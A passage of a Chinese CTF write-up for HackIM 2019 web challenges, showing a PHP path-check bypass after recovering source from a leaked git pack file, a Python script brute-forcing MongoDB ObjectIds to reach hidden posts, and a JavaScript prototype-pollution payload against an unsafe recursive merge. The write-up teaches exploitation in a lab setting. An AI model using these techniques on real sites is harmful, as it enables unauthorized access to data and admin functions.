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">
    

所以通过这些几个设置，我们就可以得到`trackuser.php`中请求参数`m`的值为 2656613544186699742 ，发包得到对应的
Cookie

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzyxh6wfwdj21yy188483.jpg)

带着 Cookie 登录 `admin/admin`，得到下一步

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzyxicv49aj214s0703zc.jpg)

直接访问，发现是个目录列举。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzyxix89a0j215c0d03zz.jpg)

直接访问`admin.php`，发现`not_authorized`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzyxkx7owij21z018gdph.jpg)

而`pack-9d392b4893d01af61c5712fdf5aafd8f24d06a10.pack`文件则可以直接下载，我们可以通过[git tips
只有一个 pack 文件恢复整个系统](http://du1abadd.org/2010/git-tips-%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA-pack-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E6%95%B4%E4%B8%AA%E7%B3%BB%E7%BB%9F/)

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzyxrbugonj21hu0neb29.jpg)

得到`admin.php`文件

    
    
    <?php
    
    if ($_SESSION['go']) {
    
        $sp_php = explode('/', $_SERVER['PHP_SELF']);
        $langfilename = $sp_php[count($sp_php) - 1];
    
        $pageListArray = array('index.php' => "1");
    
        if ($pageListArray[$langfilename] != 1) {
            echo "not_authorized";
            Header("Location: index.php?not_authorized");
    
        } else {
            echo "hackim19{}";
        }
    } else {
    
        echo "you need to complete the first barrier";
    
    }
    
    
    ?>
    

简单审计，获取路径后检查`index.php`是否存在路径当中，我们用`admin.php/index.php`就可以简单绕过得到 flag

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzyy3demyvj21z018cwnq.jpg)

###  proton

> ​ Alice web site has been hacked and hackers removed the submit post option
> and posted some unwanted messages can you get them?
>
> Hint
>
>   * mango can be eaten in 60 seconds
>   * Mongo Mongo Mongo !!! and this is not a sql Injection
>

题目设置

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzyy8iow35j20wu0figmc.jpg)

访问`/getPOST`又得到

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzyy95ei3tj213e0fqmyv.jpg)

添加`id`参数访问

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzyya21l9xj218q0go75g.jpg)

单引号尝试注入，发现报错

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzyydwd2f8j21zq08imyk.jpg)

注入无果后，看了一下发现是个 Node.js 的站，尝试使用之前的 payload 检查错误信息

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzz7l6s70rj21d60k07al.jpg)

然而并没有发现什么可疑的js库，而且题目既然给出了不是 sql 注入的话，我们就需要得另找方向。

MongoDB 中有一个`ObjectId`的概念，它是一种 MongoDB 的类型

> ​ ObjectIds are small, likely unique, fast to generate, and ordered.
> ObjectId values consist of 12 bytes, where the first four bytes are a
> timestamp that reflect the ObjectId’s creation. Specifically:
>
>   * a 4-byte value representing the seconds since the Unix epoch,
>   * a 5-byte random value, and
>   * a 3-byte counter, starting with a random value.
>

参考[Angstrom CTF 2018] The Best Website Write-up
(Web230)](https://www.pwndiary.com/write-ups/angstrom-ctf-2018-the-best-website-write-up-web230/)，我们可以发现中间5位虽然随机产生，但是是固定的，所以我们需要做的就是猜解前4位以及后3位。而题目给出
hint 意思是时间差应该是小于等于 60s
，然后最后三位根据一开始给出的`id=5c51b9c9144f813f31a4c0e2`，从`a4c0e2`开始`+1`枚举到`a4c0ef`，但是这道题比较坑的地方也就在这，最后题目顺序并不是从这顺推的，而是逆序枚举的，而且时间也不是整
60s ，所以还需要向前枚举。这里推荐大家使用[MongoDB ObjectId ↔ Timestamp
Converter](https://steveridout.github.io/mongo-object-time/)方便查看时间戳

    
    
    import requests
    
    url = 'http://localhost:4545/getPOST?id=%s144f813f31%s'  
    time = 0x5c51b9c9  
    counter = 0xa4c0e2
    
    for i in range(100):  
        counter = hex(counter - 1)[2:]
        for i in range(1000000):
            time = hex(time - 1)[2:] 
            nurl = url % (time, counter)
            res = requests.get(nurl)
            if 'Not found' not in res.text:
                print(res.text, nurl)
                time = int(time, 16)
                counter = int(counter, 16)
                break
            time = int(time, 16)
    

终于在`id=5c51b911144f813f31a4c0df`得到关键信息

    
    
    I told you you follow the White Rabbit. http://localhost:4545/getPOST?id=5c51b98d144f813f31a4c0e1
    
    Did you actually come back ?? Go Away! http://localhost:4545/getPOST?id=5c51b952144f813f31a4c0e0
    
    Shit MR Anderson and his agents are here. Hurryup!. Pickup the landline phone to exit back to matrix! - /4f34685f64ec9b82ea014bda3274b0df/  http://localhost:4545/getPOST?id=5c51b911144f813f31a4c0df
    

访问`/5c51b911144f813f31a4c0df`得到源码

    
    
    'use strict';
    
    const express = require('express');
    const bodyParser = require('body-parser')
    const cookieParser = require('cookie-parser');
    const path = require('path');
    
    
    const isObject = obj => obj && obj.constructor && obj.constructor === Object;
    
    function merge(a,b){
     for (var attr in b){   
       if(isObject(a[attr]) && isObject(b[attr])){
          merge(a[attr],b[attr]);
       }
       else{
        a[attr] = b[attr];
     }
     }  
     return a 
    } 
    
    function clone(a){
      return merge({},a);
    }
    
    // Constants
    const PORT = 8080;
    const HOST = '0.0.0.0';
    const admin = {};
    
    // App
    const app = express();
    app.use(bodyParser.json())
    app.use(cookieParser());
    
    app.use('/', express.static(path.join(__dirname, 'views')))
    
    app.post('/signup', (req, res) => {
      var body = JSON.parse(JSON.stringify(req.body));
      var copybody = clone(body)
      if(copybody.name){
          res.cookie('name', copybody.name).json({"done":"cookie set"}); 
      }
      else{
        res.json({"error":"cookie not set"})
      }
    });
    
    app.get('/getFlag', (req, res) => {
    
    
         var аdmin=JSON.parse(JSON.stringify(req.cookies))
    
        if(admin.аdmin==1){
          res.send("hackim19{}");
        }
        else{
          res.send("You are not authorized"); 
        }
    
    
    });
    
    
    app.listen(PORT, HOST);
    console.log(`Running on http://${HOST}:${PORT}`);
    

需要我们将`const admin`的`admin`属性设置为1，比较明显的一个 js
原型链污染，我们只需要让一个`Object.prototype`设置为`{"admin":1}`即可，而我们还需要一个`name`参数，所以我们大致可以这样构造：`{"name":
"xxx", "__proto__":{"аdmin":"1"}}`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fzzd8ufu6yj21m40f8jwk.jpg)

在第二个for循环中，由于`__proto__`是一个`Object`，会递归进入`merge()`，由于`__proto__`有一对`key-value`，所以会判断`__proto__["admin"]`是否是`Object`，不是就进入`else`，对原型`__proto__["admin"]`赋值为1，这就完成了原型链污染的操作。

最后访问`/getFlag`成功获得flag

    
    
    hackim19{Prototype_for_the_win}
    

国内关于原型链的文章还是比较少的，推荐一篇梅子酒师傅写的[JavaScript原型链污染](https://otakekumi.github.io/2018/09/11/JavaScript_Prototype_Pollution/)，写的还是不错的。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Zedd** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/170708](/post/id/170708)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [Web安全](/tag/Web安全)

 **+1** __8赞

 __收藏

![](https://p3.ssl.qhimg.com/t010857340ce46bb672.jpg) Zedd

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

